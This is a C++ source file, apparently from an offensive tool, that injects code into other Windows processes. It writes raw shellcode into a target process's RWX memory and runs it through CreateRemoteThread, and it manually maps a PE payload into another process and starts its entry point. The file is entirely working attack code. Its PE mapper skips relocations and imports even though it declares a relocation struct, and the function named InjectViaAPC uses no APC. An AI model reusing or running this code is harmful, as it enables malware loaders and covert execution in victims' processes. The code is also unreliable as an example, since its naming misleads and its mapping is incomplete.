#include "process_injection.hpp"
#include <iostream>
#include <tlhelp32.h>
#include <winternl.h>

// Structure for relocation entries
typedef struct IMAGE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, *PIMAGE_RELOCATION_ENTRY;

ProcessInjection::~ProcessInjection() {
    if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
    }
}

bool ProcessInjection::IsPEPayload(const std::vector<uint8_t>& payload) {
    if (payload.size() < sizeof(IMAGE_DOS_HEADER)) {
        return false;
    }

    auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)payload.data();
    if (lpImageDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }

    if (lpImageDOSHeader->e_lfanew < sizeof(IMAGE_DOS_HEADER) || lpImageDOSHeader->e_lfanew > payload.size() - sizeof(IMAGE_NT_HEADERS64)) {
        return false;
    }

    auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)payload.data() + lpImageDOSHeader->e_lfanew);
    return lpImageNTHeader->Signature == IMAGE_NT_SIGNATURE;
}

bool ProcessInjection::InjectShellcode(DWORD pid, const std::vector<uint8_t>& shellcode) {
    if (verbose) std::cout << "[*] Detected: Raw shellcode\n";
    if (verbose) std::cout << "[*] Opening existing process PID " << pid << "...\n";

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cout << "[-] OpenProcess failed: error " << GetLastError() << "\n";
        return false;
    }
    if (verbose) std::cout << "[+] Process opened: 0x" << std::hex << (uintptr_t)hProcess << std::dec << "\n";

    if (verbose) std::cout << "[*] Allocating memory (" << shellcode.size() << " bytes)...\n";
    LPVOID shellcodeAddr = VirtualAllocEx(hProcess, NULL, shellcode.size(),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcodeAddr) {
        std::cout << "[-] VirtualAllocEx failed: error " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return false;
    }
    if (verbose) std::cout << "[+] Memory allocated at: 0x" << std::hex << (uintptr_t)shellcodeAddr << std::dec << "\n";

    if (verbose) std::cout << "[*] Writing shellcode...\n";
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, shellcodeAddr, shellcode.data(),
        shellcode.size(), &bytesWritten) || bytesWritten != shellcode.size()) {
        std::cout << "[-] WriteProcessMemory failed: error " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, shellcodeAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    if (verbose) std::cout << "[+] Shellcode written: " << bytesWritten << " bytes\n";

    if (verbose) std::cout << "[*] Creating remote thread...\n";
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        LPTHREAD_START_ROUTINE(shellcodeAddr), NULL, 0, NULL);
    if (!hThread) {
        std::cout << "[-] CreateRemoteThread failed: error " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, shellcodeAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    if (verbose) std::cout << "[+] Remote thread created: 0x" << std::hex << (uintptr_t)hThread << std::dec << "\n";

    DWORD dwExitCode = 0;
    WaitForSingleObject(hThread, 10000);
    GetExitCodeThread(hThread, &dwExitCode);
    if (verbose) std::cout << "[+] Thread exit code: " << dwExitCode << "\n";

    CloseHandle(hThread);
    CloseHandle(hProcess);
    if (verbose) std::cout << "[+] Injection complete\n";
    return true;
}

bool ProcessInjection::InjectPE(DWORD pid, const std::vector<uint8_t>& payload) {
    if (verbose) std::cout << "[*] Detected: PE payload\n";
    if (verbose) std::cout << "[*] Parsing PE header...\n";

    auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)payload.data();
    auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)payload.data() + lpImageDOSHeader->e_lfanew);

    if (verbose) {
        std::cout << "[+] Payload ImageBase: 0x" << std::hex << lpImageNTHeader->OptionalHeader.ImageBase << std::dec << "\n";
        std::cout << "[+] Payload SizeOfImage: 0x" << std::hex << lpImageNTHeader->OptionalHeader.SizeOfImage << std::dec << "\n";
        std::cout << "[+] Payload EntryPoint: 0x" << std::hex << lpImageNTHeader->OptionalHeader.AddressOfEntryPoint << std::dec << "\n";
    }

    if (verbose) std::cout << "[*] Opening target process PID " << pid << "...\n";
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cout << "[-] OpenProcess failed: error " << GetLastError() << "\n";
        return false;
    }
    if (verbose) std::cout << "[+] Process opened\n";

    if (verbose) std::cout << "[*] Allocating memory...\n";
    LPVOID lpAllocAddress = VirtualAllocEx(hProcess, (LPVOID)lpImageNTHeader->OptionalHeader.ImageBase,
                                           lpImageNTHeader->OptionalHeader.SizeOfImage,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpAllocAddress) {
        if (verbose) std::cout << "[*] Cannot allocate at preferred ImageBase, allocating at any address...\n";
        lpAllocAddress = VirtualAllocEx(hProcess, nullptr,
                                        lpImageNTHeader->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!lpAllocAddress) {
            std::cout << "[-] VirtualAllocEx failed: error " << GetLastError() << "\n";
            CloseHandle(hProcess);
            return false;
        }
    }
    if (verbose) std::cout << "[+] Memory allocated at: 0x" << std::hex << (uintptr_t)lpAllocAddress << std::dec << "\n";

    if (verbose) std::cout << "[*] Writing PE headers...\n";
    if (!WriteProcessMemory(hProcess, lpAllocAddress, (LPVOID)payload.data(),
                           lpImageNTHeader->OptionalHeader.SizeOfHeaders, nullptr)) {
        std::cout << "[-] WriteProcessMemory (headers) failed: error " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, lpAllocAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    if (verbose) std::cout << "[*] Writing sections...\n";
    for (int i = 0; i < lpImageNTHeader->FileHeader.NumberOfSections; i++) {
        auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader + 4 +
                                    sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader->FileHeader.SizeOfOptionalHeader +
                                    (i * sizeof(IMAGE_SECTION_HEADER)));

        LPVOID section_dest = (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress);
        LPVOID section_src = (LPVOID)((uintptr_t)payload.data() + lpImageSectionHeader->PointerToRawData);

        if (!WriteProcessMemory(hProcess, section_dest, section_src,
                               lpImageSectionHeader->SizeOfRawData, nullptr)) {
            std::cout << "[-] WriteProcessMemory (section) failed: error " << GetLastError() << "\n";
            VirtualFreeEx(hProcess, lpAllocAddress, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }
        if (verbose) std::cout << "[+] Section written\n";
    }

    if (verbose) std::cout << "[*] Creating remote thread at entry point...\n";
    LPVOID lpEntryPoint = (LPVOID)((uintptr_t)lpAllocAddress + lpImageNTHeader->OptionalHeader.AddressOfEntryPoint);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)lpEntryPoint, NULL, 0, NULL);
    if (!hThread) {
        std::cout << "[-] CreateRemoteThread failed: error " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, lpAllocAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    if (verbose) std::cout << "[+] Remote thread created at: 0x" << std::hex << (uintptr_t)lpEntryPoint << std::dec << "\n";

    DWORD dwExitCode = 0;
    WaitForSingleObject(hThread, 10000);
    GetExitCodeThread(hThread, &dwExitCode);
    if (verbose) std::cout << "[+] Thread exit code: " << dwExitCode << "\n";

    CloseHandle(hThread);
    CloseHandle(hProcess);
    if (verbose) std::cout << "[+] PE injection complete\n";
    return true;
}

bool ProcessInjection::InjectViaAPC(DWORD pid, const std::vector<uint8_t>& payload) {
    if (verbose) std::cout << "\n[*] Smart injection - detecting payload type...\n";

    if (IsPEPayload(payload)) {
        return InjectPE(pid, payload);
    } else {
        return InjectShellcode(pid, payload);
    }
}